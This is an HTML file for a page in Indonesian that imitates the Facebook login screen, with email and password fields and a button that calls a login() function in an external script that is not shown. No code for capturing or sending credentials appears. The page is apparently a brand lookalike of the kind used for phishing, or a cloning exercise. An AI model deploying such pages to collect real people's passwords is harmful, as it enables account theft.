<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="login-form">
            <div class="logo-icon">
                <h1 class="face">f</h1>
            </div>
            <input id="email" type="text" oninput="toggleButton()" placeholder="Email atau Nomor Telepon" required>
            <input id="password" type="password" oninput="toggleButton()" placeholder="Kata Sandi" required>
            <button id="log" onclick="login()" disabled>Masuk</button>
        </div>
        <div class="forgot-password">
            <a href="#">Lupa kata sandi?</a>
        </div>
        <div class="create-account">
            <button>Buat akun baru</button>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
